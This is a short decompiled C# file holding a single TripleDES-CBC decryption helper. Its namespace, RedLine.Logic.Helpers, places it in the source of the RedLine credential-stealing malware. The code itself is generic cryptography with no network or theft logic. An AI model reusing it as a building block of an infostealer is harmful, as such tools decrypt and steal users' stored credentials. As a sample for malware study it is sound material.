using System;
using System.Security.Cryptography;
using System.Text;

namespace RedLine.Logic.Helpers
{
	// Token: 0x0200005F RID: 95
	public static class TripleDESHelper
	{
		// Token: 0x060002A8 RID: 680 RVA: 0x0000B680 File Offset: 0x00009880
		public static string Decrypt(byte[] key, byte[] iv, byte[] input, PaddingMode paddingMode = PaddingMode.None)
		{
			string @string;
			using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
			{
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.IV = iv;
				tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
				tripleDESCryptoServiceProvider.Padding = paddingMode;
				using (ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor(key, iv))
				{
					@string = Encoding.GetEncoding("windows-1251").GetString(cryptoTransform.TransformFinalBlock(input, 0, input.Length));
				}
			}
			return @string;
		}
	}
}
